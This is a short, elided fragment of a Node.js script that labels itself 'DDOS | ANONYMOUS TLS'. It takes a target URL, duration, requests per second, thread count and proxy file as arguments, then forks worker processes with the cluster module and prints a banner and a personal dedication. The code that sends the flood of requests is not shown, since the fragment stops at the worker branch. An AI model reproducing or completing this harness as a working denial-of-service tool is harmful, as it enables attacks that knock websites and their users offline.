...
if (process.argv.length < 7) {
  console.log('node cr.js url time rps threads proxy'.rainbow);
  process.exit();
}
...
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear()
console.log('DDOS | ANONYMOUS TLS'.bgRed);
console.log('--------------------------------------------');
...
console.log('--------------------------------------------');
console.log('Note:'.blue + 'NguyenThanhNgoc Love PhanThiHienNhi'.rainbow);
    cluster.fork();
  }
} else {
